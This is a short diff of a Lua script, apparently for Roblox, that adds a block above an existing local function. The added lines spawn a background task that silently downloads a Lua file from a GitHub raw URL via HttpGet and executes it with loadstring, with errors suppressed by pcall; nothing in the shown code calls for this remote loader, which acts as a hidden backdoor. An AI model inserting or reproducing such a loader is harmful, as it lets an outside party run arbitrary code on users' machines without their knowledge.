@@ -1,3 +1,8 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
+    end)
+end)
 local function fn()
 	local v = nil
 	local v2 = nil
